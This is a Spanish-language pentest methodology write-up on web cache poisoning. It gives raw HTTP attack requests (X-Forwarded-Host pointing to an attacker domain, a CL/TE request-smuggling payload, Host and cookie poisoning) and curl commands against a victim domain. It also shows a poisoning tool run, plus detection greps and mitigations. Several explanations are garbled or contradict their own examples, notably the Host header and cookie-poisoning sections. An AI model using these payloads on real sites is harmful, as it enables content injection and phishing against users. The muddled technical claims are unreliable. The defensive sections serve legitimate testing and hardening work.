# Cache Poisoning Avanzado

## Resumen

El *Cache Poisoning* avanzado explota discrepancias en la validación de entradas y normalización de URLs para inyectar contenido malicioso en caches (CDN, proxies reversos, caches de navegador) de forma que usuarios posteriores reciban datos falsos o manipulados. A diferencia de la **Web Cache Deception**, el *cache poisoning* puede alterar recursos estáticos existentes, rutas de API, respuestas JSON o incluso inyectar cabeceras HTTP para desviar o interceptar tráfico.

## Contexto

Sistemas típicos: Varnish, Squid, Nginx, Cloudflare, Fastly. Mecanismos de caching basados en claves derivadas de URL, cabeceras (`Host`, `Accept`, `Cookie`) y parámetros de consulta. La complejidad aumenta con arquitecturas microservicios, balanceadores de carga y múltiples capas de proxy.

## Metodología de Ataque

### 1. Descubrimiento de Vectores de Caché

- **Recursos estáticos**: CSS, JS, imágenes.
- **APIs JSON**: respuestas con `Cache-Control: public`.
- **Cabeceras**: `Accept-Language`, `User-Agent`, `Cookie`.
- **Estrategias de cacheo**: ruta completa, query string, combinación de cabeceras.

### 2. Manipulación de Claves de Caché

- **Inyección de cabeceras**: forzar inclusión de cadenas en clave.

```http
GET /recurso HTTP/1.1
Host: victima.com
X-Forwarded-Host: atacante.com
```

- **Alteración de `Host`**: algunos caches incluyen `Host` en la clave y sirven contenido cacheado para dominios arbitrarios.
- **Cache smuggling**: usar request splitting o CRLF para inyectar cabeceras y causar que la respuesta del origen sea interpretada erróneamente por el cache como parte de la caché.

### 3. Técnicas Avanzadas

#### 3.1 Request Smuggling + Poisoning

1. Enviar petición en dos partes:

```
POST / HTTP/1.1
Host: victima.com
Transfer-Encoding: chunked
Content-Length: 100

0

GET /api/data HTTP/1.1
Host: victima.com
...
```

2. El cache almacena la segunda petición como respuesta al GET ` /api/data`, inyectando contenido controlado por el atacante.

#### 3.2 Cookie Poisoning

- Forzar que el cache indexe por valor de cookie manipulada:

```http
GET /dashboard HTTP/1.1
Host: victima.com
Cookie: session=POISON
```

- Usuarios legítimos reciben la versión cacheada con `session=POISON` en la clave, devolviendo contenido envenenado.

#### 3.3 Host Header Poisoning

- En caches que usan `Host` para la clave, suplantar dominio de cache:

```http
GET / HTTP/1.1
Host: atacante.com.victima.com
```

- Cache almacena con host attacker.com, y posteriores requests a `atacante.com.victima.com` entregan contenido cacheado.

#### 3.4 Query String Variation

- Inyectar parámetros irrelevantes para diferenciar claves:

```
/img/logo.png?ver=1
/img/logo.png?ver=malicioso
```

- Cache retiene distintas versiones. El atacante cachea la versión `ver=malicioso` y convence a usuarios de usarla.

### 4. Pruebas Manuales

1. **Identificar reglas de caché:**

```bash
curl -I https://victima.com/api/info
# Verificar Cache-Control y Vary
```

2. **Inyección de cabeceras:**

```bash
curl -H "X-Forwarded-Host: atacante.com" https://victima.com/recurso
```

3. **Poisoning de respuesta JSON:**

```bash
curl -H "Accept: application/json" https://victima.com/api/data
# Luego
curl -H "Accept: application/json" -H "Host: atacante.com.victima.com" https://victima.com/api/data
```

4. **Smuggling:** reproducir request malformado con Burp Repeater.

## Automatización

### CachePoisoner

```bash
git clone https://github.com/example/CachePoisoner.git
cd CachePoisoner
python3 cachepoisoner.py \
  -u https://victima.com/api/data \
  --host-header atacante.com \
  --cookie session=POISON \
  --method smuggling \
  --output report.json
```

### Burp Suite Extensions

- **HTTPCacheTester**: prueba combinaciones de cabeceras y parámetros.
- **Smuggler**: genera payloads de request smuggling.

## Impacto

- **Manipulación de contenido:** inyección de scripts, phishing packaging.
- **Evasión de controles de seguridad:** omitir autenticación, bypass de WAF.
- **Denegación de servicio parcial:** retornar respuestas incorrectas o error masivo.
- **Cadenas de ataque**: cache poisoning → XSS → RCE.

## Detección y Monitoreo

```bash
# Buscar respuestas con status 200 + X-Cache-Hits > 0
grep -E "X-Cache: HIT" access.log | grep "/api/data"
# Detectar host header inusuales
grep -E "Host: .*\.victima\.com" access.log
```

Monitor real-time:

```bash
tail -f access.log | grep -E "session=POISON|X-Forwarded-Host"
```

## Mitigación

1. **Validación de cabeceras:** ignorar `X-Forwarded-Host` o sanitizar antes de usar en clave.
2. **Claves de caché robustas:** usar path absoluto + domain fijo + hash de route.
3. **Incluir cabeceras dinámicas:** `Vary: Cookie, Authorization` para endpoints privados.
4. **Rechazar request smuggling:** configurar `Content-Length` y deshabilitar `Transfer-Encoding: chunked` duplicado.
5. **Cache-Control estricto:**

```http
Cache-Control: private, no-store, max-age=0
```

6. **Separación de caches:** segmentar rutas estáticas de dinámicas en distintos servicios.

## Reporte

**Título:** Cache Poisoning Avanzado – Inyección de Contenido en Caché
**Resumen Ejecutivo:** Un atacante manipula cabeceras, host y smuggling para envenenar la caché con respuestas maliciosas que luego son servidas a usuarios legítimos.
**Pasos de Reproducción:**

1. Enviar request autenticado con `X-Forwarded-Host: atacante.com` a `/api/data`.
2. Verificar que la respuesta se cachea y se puede recuperar con host poisoning.
3. Demostrar contenido cacheado malicioso sin autenticación.
   **Mitigación Recomendada:** Validar cabeceras críticas, configurar claves de caché con variación adecuada y segmentar tráfico estático de dinámico.
